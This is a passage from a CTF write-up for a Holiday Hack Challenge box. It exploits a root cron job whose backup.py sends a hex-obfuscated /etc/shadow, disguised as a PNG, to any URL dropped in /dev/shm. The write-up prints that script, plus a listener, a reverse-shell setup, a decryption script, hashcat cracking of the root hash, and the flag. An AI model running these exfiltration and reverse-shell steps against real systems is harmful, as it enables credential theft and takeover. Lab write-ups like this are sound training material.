+    <code>root</code>. While looking for a potential privilege escalation path, I found an interesting
+    cron job configuration that executes a Python script as <code>root</code> every minute.
+  </p>
+</div>
+
+<!-- AWS shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-output">www-data@b66411054875:/$</span> <span class="term-kali-command">cat /etc/cron.d/mycron</span>
+<span class="term-kali-output"># /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* * * * *   root    /var/backups/backup.py &</span>
+
+<span class="term-kali-output">www-data@b66411054875:/$</span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+<p>
+    Taking a deeper look into <code>backup.py</code>, we can simply read it directly with:
+</p>
+<p>
+    <code>cat /var/backups/backup.py</code>
+  </p>
+</div>
+
+<!-- Python script (outside the bubble) -->
+<div class="kc-code-window kc-code-window--py">
+  <div class="kc-code-titlebar">
+    <span class="kc-code-icon">&gt;_</span>
+    <span class="kc-code-title">backup.py</span>
+
+    <!-- Copy button -->
+    <button
+      class="kc-code-copy-btn kc-code-copy"
+      type="button"
+      data-copy-target="#backup-py"
+      aria-label="Copy backup.py"
+      title="Copy"
+    >
+      <i class="fas fa-copy" aria-hidden="true"></i>
+      <span>Copy</span>
+    </button>
+  </div>
+
+  <!-- Page-local tweaks (optional): taller + slightly smaller text for this block -->
+  <style>
+    .kc-code-window--py .kc-code-block--taller { max-height: 820px; }
+    .kc-code-window--py code[class*="language-"] { font-size: 0.92em; }
+  </style>
+
+  <pre class="kc-code-block kc-code-block--taller kc-no-wheel"><code id="backup-py" class="language-python">#!/usr/local/bin/python3
+from PIL import Image
+import math
+import os
+import re
+import subprocess
+import requests
+import random
+
+cmd = "ls -la /dev/shm/ | grep -E '\\.frosty[0-9]+$' | awk -F &quot; &quot; '{print $9}'"
+files = subprocess.check_output(cmd, shell=True).decode().strip().split('\n')
+
+BLOCK_SIZE = 6
+random_key = bytes([random.randrange(0, 256) for _ in range(0, BLOCK_SIZE)])
+
+def boxCrypto(block_size, block_count, pt, key):
+    currKey = key
+    tmp_arr = bytearray()
+    for i in range(block_count):
+        currKey = crypt_block(pt[i*block_size:(i*block_size)+block_size], currKey, block_size)
+        tmp_arr += currKey
+    return tmp_arr.hex()
+
+def crypt_block(block, key, block_size):
+    retval = bytearray()
+    for i in range(0, block_size):
+        retval.append(block[i] ^ key[i])
+    return bytes(retval)
+
+def create_hex_image(input_file, output_file=&quot;hex_image.png&quot;):
+    with open(input_file, 'rb') as f:
+        data = f.read()
+
+    pt = data + (BLOCK_SIZE - (len(data) % BLOCK_SIZE)) * b'\x00'
+    block_count = int(len(pt) / BLOCK_SIZE)
+    enc_data = boxCrypto(BLOCK_SIZE, block_count, pt, random_key)
+    enc_data = bytes.fromhex(enc_data)
+
+    file_size = len(enc_data)
+    width = int(math.sqrt(file_size))
+    height = math.ceil(file_size / width)
+
+    img = Image.new('RGB', (width, height), color=(0, 0, 0))
+    pixels = img.load()
+
+    for i, byte in enumerate(enc_data):
+        x = i % width
+        y = i // width
+        if y &lt; height:
+            pixels[x, y] = (0, 0, byte)
+
+    img.save(output_file)
+    print(f&quot;Image created: {output_file}&quot;)
+
+for file in files:
+    if not file:
+        continue
+
+    with open(f&quot;/dev/shm/{file}&quot;, 'r') as f:
+        addr = f.read().strip()
+
+    if re.match(r'^https?://[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', addr):
+        exfil_file = b'\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77'.decode()
+
+        if os.path.isfile(exfil_file):
+
+            try:
+                create_hex_image(exfil_file, output_file=&quot;/dev/shm/.tmp.png&quot;)
+                data = bytearray()
+                with open(f&quot;/dev/shm/.tmp.png&quot;, 'rb') as f:
+                    data = f.read()
+                os.remove(&quot;/dev/shm/.tmp.png&quot;)
+                requests.post(
+                    url=addr,
+                    data={&quot;secret_file&quot;: data},
+                    timeout=10,
+                    verify=False
+                )
+            except requests.exceptions.RequestException:
+                pass
+    else:
+        print(f&quot;Invalid URL format: {addr} - request ignored&quot;)
+
+    # Remove the file
+    os.remove(f&quot;/dev/shm/{file}&quot;)</code></pre>
+</div>
+
+<!-- Optional: page-local Prism refresh for lazy-loaded content -->
+<script>
+  window.requestAnimationFrame(() => {
+    const root = document.querySelector('.kc-code-window--py');
+    if (!root) return;
+    if (window.Prism && Prism.highlightAllUnder) Prism.highlightAllUnder(root);
+    else if (window.Prism && Prism.highlightAll) Prism.highlightAll();
+  });
+</script>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p><strong>Let’s quickly unpack what it does:</strong></p>
+  <ul class="kc-note-list">
+    <li>Every minute, as <code>root</code>, it runs <code>/var/backups/backup.py</code>.</li>
+    <li>That script scans <code>/dev/shm</code> for files matching <code>*.frosty&lt;number&gt;</code>.</li>
+    <li>Each matching file contains a URL (<code>addr</code>).</li>
+    <li>If <code>addr</code> matches a URL regex, it:
+      <ul>
+        <li>Sets <code>exfil_file</code> to <code>/etc/shadow</code></li>
+        <li>Encrypts it into a PNG at <code>/dev/shm/.tmp.png</code></li>
+        <li>POSTs the PNG bytes to <code>addr</code> via
+          <code>requests.post(addr, data={"secret_file": data}, ...)</code>
+        </li>
+        <li>Deletes <code>.tmp.png</code> and the <code>.frosty*</code> file</li>
+      </ul>
+    </li>
+  </ul>
+
+  <p>
+    So: if we drop a <code>*.frosty</code> file pointing to a URL we control, <code>root</code> will POST us an
+    encrypted PNG of <code>/etc/shadow</code>. Next up: a simple listener to catch that POST.
+  </p>
+</div>
+
+<!-- Python script (outside the bubble) -->
+<div class="kc-code-window kc-code-window--py">
+  <div class="kc-code-titlebar">
+    <span class="kc-code-icon">&gt;_</span>
+    <span class="kc-code-title">catcher.py</span>
+
+    <!-- Copy button -->
+    <button
+      class="kc-code-copy-btn kc-code-copy"
+      type="button"
+      data-copy-target="#catcher-py"
+      aria-label="Copy catcher.py"
+      title="Copy"
+    >
+      <i class="fas fa-copy" aria-hidden="true"></i>
+      <span>Copy</span>
+    </button>
+  </div>
+
+  <!-- Page-local tweaks (optional): taller + slightly smaller text for this block -->
+  <style>
+    .kc-code-window--py .kc-code-block--taller { max-height: 760px; }
+    .kc-code-window--py code[class*="language-"] { font-size: 0.92em; }
+  </style>
+
+  <pre class="kc-code-block kc-code-block--taller kc-no-wheel"><code id="catcher-py" class="language-python">#!/usr/bin/env python3
+# save as catcher.py and run: python3 catcher.py
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
+import sys
+
+
+class Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        try:
+            # Safely read the request body
+            length_header = self.headers.get('Content-Length', '0')
+            try:
+                length = int(length_header)
+            except ValueError:
+                self.send_error(400, "Invalid Content-Length")
+                return
+
+            body = self.rfile.read(length)
+
+            # Detect content-type
+            content_type = self.headers.get('Content-Type', '')
+
+            # If it's form data, extract the 'secret_file' field.
+            # Otherwise, treat the entire body as the file.
+            if content_type.startswith("application/x-www-form-urlencoded"):
+                try:
+                    # Decode body 1:1, then parse_qs with latin-1 so we round-trip bytes
+                    qs = body.decode('latin-1')
+                    params = urllib.parse.parse_qs(
+                        qs,
+                        keep_blank_values=True,
+                        encoding='latin-1',  # preserve 0–255
+                        errors='strict'      # no silent replacement chars
+                    )
+                    values = params.get('secret_file')
+                    if not values:
+                        self.send_error(400, "Missing 'secret_file' field")
+                        return
+
+                    # This is now a str whose codepoints 0–255 map exactly to original bytes
+                    sf_bytes = values[0].encode('latin-1')
+                except Exception as e:
+                    # Don’t crash the whole server on bad input
+                    sys.stderr.write(f"[!] Error parsing form data: {e}\n")
+                    self.send_error(400, "Failed to parse form data")
+                    return
+            else:
+                # Raw body mode: preserve body exactly as sent
+                sf_bytes = body
+
+            # Write the file to disk
+            try:
+                with open('secret_file.bin', 'wb') as f:
+                    f.write(sf_bytes)
+            except OSError as e:
+                sys.stderr.write(f"[!] Failed to write file: {e}\n")
+                self.send_error(500, "Failed to save file")
+                return
+
+            # Respond OK
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"OK\n")
+
+        except Exception as e:
+            # Catch-all so the handler doesn’t die noisily
+            sys.stderr.write(f"[!] Unexpected error in do_POST: {e}\n")
+            try:
+                self.send_error(500, "Internal server error")
+            except Exception:
+                pass  # If even this fails, just swallow it
+
+    # Optional: quiet default logging if you prefer
+    def log_message(self, format, *args):
+        sys.stderr.write("%s - - [%s] %s\n" %
+                         (self.client_address[0],
+                          self.log_date_time_string(),
+                          format % args))
+
+
+if __name__ == "__main__":
+    HTTPServer(('', 8182), Handler).serve_forever()</code></pre>
+</div>
+
+<!-- Optional: Prism refresh for lazy-loaded content -->
+<script>
+  window.requestAnimationFrame(() => {
+    const root = document.querySelector('.kc-code-window--py');
+    if (!root) return;
+    if (window.Prism && Prism.highlightAllUnder) Prism.highlightAllUnder(root);
+    else if (window.Prism && Prism.highlightAll) Prism.highlightAll();
+  });
+</script>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    On my AWS box, I restaged everything so we’re ready for the next step. I started a simple web server to host
+    <code>revsh</code>, launched <code>catcher.py</code> in the background (standing by to receive the exfiltrated file),
+    and finally restarted <code>nc</code> to catch the reverse shell. Then we’ll create the
+    <code>*.frosty&lt;number&gt;</code> file that <code>backup.py</code> is looking for.
+  </p>
+</div>
+
+<!-- AWS shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-output">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command">python3 -m http.server 8000 &amp;</span>
+<span class="term-kali-output">[1] 228309</span>
+<span class="term-kali-output">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+
+<span class="term-kali-output">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command">python3 catcher.py &amp;</span>
+<span class="term-kali-output">[2] 228310</span>
+
+<span class="term-kali-output">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command">sudo nc -lvnp 443</span>
+<span class="term-kali-output">Listening on 0.0.0.0 443</span>
+<span class="term-kali-output">104.198.212.235 - - [04/Jan/2026 00:10:04] "GET /revsh HTTP/1.1" 200 -</span>
+<span class="term-kali-output">Connection received on 104.198.212.235 58316</span>
+<span class="term-kali-output">bash: cannot set terminal process group (19): Inappropriate ioctl for device</span>
+<span class="term-kali-output">bash: no job control in this shell</span>
+<span class="term-kali-output">www-data@b66411054875:/app$</span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Next, we create the file that <code>backup.py</code> is looking for. Passing the URL regex check is key — otherwise
+    we fall through to the <code>else</code> branch and get <em>“Invalid URL format …”</em>. The file content is the URL
+    for our AWS host (plus the port where <code>catcher.py</code> is listening).
+  </p>
+</div>
+
+<!-- AWS shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-output">www-data@b66411054875:/app$</span> <span class="term-kali-command">echo 'http://54.163.15.191.nip.io:8182' &gt; /dev/shm/test.frosty1</span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    After dropping the <code>.frosty</code> file, we wait about a minute for the root cron job to run
+    <code>/var/backups/backup.py</code> and POST the encrypted PNG data to our listener.
+  </p>
+</div>
+
+<!-- AWS shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-output">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command">python3 catcher.py</span>
+
+<span class="term-kali-output">34.69.168.206 - - [04/Jan/2026 01:37:02] "POST / HTTP/1.1" 200 -</span>
+
+<span class="term-kali-output">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command">file secret_file.bin</span>
+<span class="term-kali-output">secret_file.bin: PNG image data, 25 x 27, 8-bit/color RGB, non-interlaced</span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    The file we exfiltrated is encrypted, but the scheme is weak: only the first <code>6</code> bytes of plaintext depend
+    on the unknown initial key (<code>K0</code>). From block 1 onward, everything is recoverable because:
+    <span class="kc-hint-blue"><code>P<i>i</i> = C<i>i</i> XOR C<i>i-1</i></code></span>. Creating a simple decryption script to recover
+    <code>/etc/shadow</code> is straightforward.
+  </p>
+</div>
+
+<!-- Python script (outside the bubble) -->
+<div class="kc-code-window kc-code-window--py">
+  <div class="kc-code-titlebar">
+    <span class="kc-code-icon">&gt;_</span>
+    <span class="kc-code-title">decrypt.py</span>
+
+    <!-- Copy button -->
+    <button
+      class="kc-code-copy-btn kc-code-copy"
+      type="button"
+      data-copy-target="#decrypt-py"
+      aria-label="Copy Python script"
+      title="Copy"
+    >
+      <i class="fas fa-copy" aria-hidden="true"></i>
+      <span>Copy</span>
+    </button>
+  </div>
+
+  <!-- Page-local tweaks (optional): taller + slightly smaller text for this block -->
+  <style>
+    .kc-code-window--py .kc-code-block--taller { max-height: 760px; }
+    .kc-code-window--py code[class*="language-"] { font-size: 0.92em; }
+  </style>
+
+  <pre class="kc-code-block kc-code-block--taller kc-no-wheel"><code id="decrypt-py" class="language-python">#!/usr/bin/env python3
+from PIL import Image
+
+BLOCK_SIZE = 6
+
+# 1. Load the PNG produced by backup.py
+im = Image.open("secret_file.bin")
+w, h = im.size
+pixels = im.load()
+
+# 2. Extract ciphertext bytes from the blue channel (row-major)
+enc = []
+for y in range(h):
+    for x in range(w):
+        r, g, b = pixels[x, y]
+        enc.append(b)
+enc = bytes(enc)
+
+# 3. Decrypt: for i &gt;= 1, P[i] = C[i] XOR C[i-1]
+blocks = [enc[i:i+BLOCK_SIZE] for i in range(0, len(enc), BLOCK_SIZE)]
+pt = bytearray(len(enc))
+
+prev = None
+for i, c in enumerate(blocks):
+    if len(c) &lt; BLOCK_SIZE:
+        break  # ignore last partial block if any
+    if i == 0:
+        # First 6 bytes depend on random key; leave as zeros
+        prev = c
+        continue
+    pblock = bytes(ci ^ pi for ci, pi in zip(c, prev))
+    pt[i*BLOCK_SIZE:(i+1)*BLOCK_SIZE] = pblock
+    prev = c
+
+# 4. Strip trailing nulls from padding
+pt = pt.rstrip(b"\\x00")
+
+with open("shadow_recovered", "wb") as f:
+    f.write(pt)
+
+print("[+] Wrote recovered data to shadow_recovered")</code></pre>
+</div>
+
+<!-- Optional: page-local Prism refresh for lazy-loaded content -->
+<script>
+  window.requestAnimationFrame(() => {
+    const root = document.querySelector('.kc-code-window--py');
+    if (!root) return;
+    if (window.Prism && Prism.highlightAllUnder) Prism.highlightAllUnder(root);
+    else if (window.Prism && Prism.highlightAll) Prism.highlightAll();
+  });
+</script>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Running <code>decrypt.py</code> against the exfiltrated PNG recovers the contents of <code>/etc/shadow</code>
+    (minus the unrecoverable first 6 bytes). The recovered file is written out as <code>shadow_recovered</code>.
+  </p>
+</div>
+
+<!-- AWS shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-output">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command">python3 decrypt.py</span>
+<span class="term-kali-output">[+] Wrote recovered data to shadow_recovered</span>
+
+<span class="term-kali-output">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command">cat shadow_recovered</span>
+<span class="term-kali-output">5$cRqqIuQIhQBC5fDG$9fO47ntK6qxgZJJcvjteakPZ/Z6FiXwer5lxHrnBuC2:20392:0:99999:7:::</span>
+<span class="term-kali-output">daemon:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">bin:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">sys:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">sync:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">games:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">man:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">lp:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">mail:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">news:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">uucp:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">proxy:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">www-data:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">backup:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">list:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">irc:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">_apt:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">nobody:*:20381:0:99999:7:::</span>
+<span class="term-kali-output">systemd-network:!*:20392:::::1:</span>
+<span class="term-kali-output">systemd-timesync:!*:20392:::::1:</span>
+<span class="term-kali-output">Debian-exim:!:20392::::::</span>
+<span class="term-kali-output">messagebus:!*:20392::::::</span>
+<span class="term-kali-output">z(N</span>
+
+<span class="term-kali-output">ubuntu@ip-172-31-28-112:~$</span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    The recovered <code>/etc/shadow</code> output is missing the first 6 bytes on the first line — this is expected,
+    since block 0 depends on the unknown initial key (<code>K0</code>). Even with that gap, the remaining structure is
+    intact and we can still proceed by reconstructing a valid-looking root entry for cracking tools.
+  </p>
+
+  <p><strong>Recovered hash:</strong><br>
+    <code class="kc-inline-hash">5$cRqqIuQIhQBC5fDG$9fO47ntK6qxgZJJcvjteakPZ/Z6FiXwer5lxHrnBuC2:20392:0:99999:7:::</code>
+  </p>
+
+  <!-- keep a little breathing room between the two sections -->
+  <div style="height: 12px;"></div>
+
+  <p><strong>What we will feed Hashcat:</strong><br>
+    <code class="kc-inline-hash"><span class="kc-hash-added">root:$5$cRqqIuQIhQBC5fDG$9fO47ntK6qxgZJJcvjteakPZ/Z6FiXwer5lxHrnBuC2:20392:0:99999:7:::</code>
+  </p>
+</div>
+
+<!-- Kali shell -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/SnowBlind_Ambush]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">hashcat -m 7400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -O</span>
+<span class="term-kali-output">hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: pthread-0x000, 4918/9901 MB (2048 MB allocatable), 6MCU
+
+Minimum password length supported by kernel: 0
+------- Truncated output ---------
+$5$cRqqIuQIhQBC5fDG$9fO47ntK6qxgZJJcvjteakPZ/Z6FiXwer5lxHrnBuC2:jollyboy
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 7400 (sha256crypt $5$, SHA256 (Unix))
+Hash.Target......: $5$cRqqIuQIhQBC5fDG$9fO47ntK6qxgZJJcvjteakPZ/Z6FiXw...rnBuC2
+Time.Started.....: Sat Jan  3 21:48:33 2026 (1 min, 39 secs)
+Time.Estimated...: Sat Jan  3 21:50:12 2026 (0 secs)
+Kernel.Feature...: Optimized Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     3550 H/s (11.05ms) @ Accel:256 Loops:128 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 350513/14344385 (2.44%)
+Rejected.........: 305/350513 (0.09%)
+Restore.Point....: 348976/14344385 (2.43%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: karen0 -&gt; jenni15
+Hardware.Mon.#1..: Util: 98%
+
+Started: Sat Jan  3 21:48:32 2026
+Stopped: Sat Jan  3 21:50:13 2026</span>
+
+<span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/SnowBlind_Ambush]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">hashcat -m 7400 hash.txt --show</span>
+<span class="term-kali-output">$5$cRqqIuQIhQBC5fDG$9fO47ntK6qxgZJJcvjteakPZ/Z6FiXwer5lxHrnBuC2:jollyboy</span>
+
+<span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/SnowBlind_Ambush]</span>
+<span class="term-kali-prompt">└─$</span> </pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Using the cracked password to escalate privileges.
+  </p>
+</div>
+
+<!-- AWS shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-output">www-data@b66411054875:/app$</span> <span class="term-kali-command">su root</span>
+<span class="term-kali-output">su root
+Password: jollyboy</span>
+
+<span class="term-kali-output">root@b66411054875:/app#</span> <span class="term-kali-command">whoami</span>
+<span class="term-kali-output">root</span>
+
+<span class="term-kali-output">root@b66411054875:/app#</span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Running <code>./unlock_access.sh</code> as <code>root</code> did not seem to provide the result I was looking for.
+  </p>
+</div>
+
+<!-- AWS shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-output">root@b66411054875:/#</span> <span class="term-kali-command">./unlock_access.sh</span>
+<span class="term-kali-output">HEY! You shouldn't be here! If you are Frosty, then welcome back! Lets restore your access to the system...
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   106  100    53  100    53  10918  10918 --:--:-- --:--:-- --:--:-- 26500
+Unlocking controls, system awaiting root commands...
+If you see no errors, the system should be unlocked for you now but they require root access.
+
+But if you are not Frosty, please leave this place at once!</span>
+
+<span class="term-kali-output">root@b66411054875:/#</span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Looking around a bit, I found a promising script in <code>/root</code>. Running it printed the secret key needed
+    to plug in the badge and stop Frosty’s plan.
+  </p>
+</div>
+
+<!-- AWS shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-output">root@b66411054875:/#</span> <span class="term-kali-command">pwd</span>
+<span class="term-kali-output">/</span>
+
+<span class="term-kali-output">root@b66411054875:/#</span> <span class="term-kali-command">ls</span>
+<span class="term-kali-output">app
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+requirements.txt
+root
+run
+sbin
+srv
+sys
+tmp
+unlock_access.sh
+usr
+var</span>
+
+<span class="term-kali-output">root@b66411054875:/#</span> <span class="term-kali-command">cd root</span>
+
+<span class="term-kali-output">root@b66411054875:/root#</span> <span class="term-kali-command">ls</span>
+<span class="term-kali-output">stop_frosty_plan.sh</span>
+
+<span class="term-kali-output">root@b66411054875:/root#</span> <span class="term-kali-command">./stop_frosty_plan.sh</span>
+<span class="term-kali-output">Welcome back, Frosty! Getting cold feet?
+Here is your secret key to plug in your badge and stop the plan:
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   111  100    58  100    53  15195  13885 --:--:-- --:--:-- --:--:-- 37000
+hhc25{Frostify_The_World_c05730b46d0f30c9d068343e9d036f80}</span>
+
+</pre>
+</div>
+
+<div class="kc-solution-header">
+  <span class="kc-solution-icon">
+    <i class="fas fa-check-circle" aria-hidden="true"></i>
+  </span>
+  <span class="kc-solution-title"><strong>SOLUTION: hhc25{Frostify_The_World_c05730b46d0f30c9d068343e9d036f80}</strong></span>
+</div>
+
+<!-- Solution dialogue banner -->
+<div class="kc-convo-header kc-solution-dialog-header">
+  <span class="kc-convo-icon">
+    <i class="fas fa-comment-dots" aria-hidden="true"></i>
+  </span>
+  <span class="kc-convo-title">Solution dialogue:</span>
+</div>
+
+<div class="kc-objective-detail kc-objective-detail--no-panel">
+  <div class="kc-convo-bubble">
+    <div class="kc-convo-avatar">
+      <img src="torkelopsahl-portrait.png"
+           alt="Torkel Opsahl avatar">
+      <div class="kc-convo-name">Torkel Opsahl</div>
+    </div>
+
+    <div class="kc-convo-text">
+      <p>
+        Fantastisk! You've climbed through every security layer like a true Thor's Warrior - that was one epic adventure!
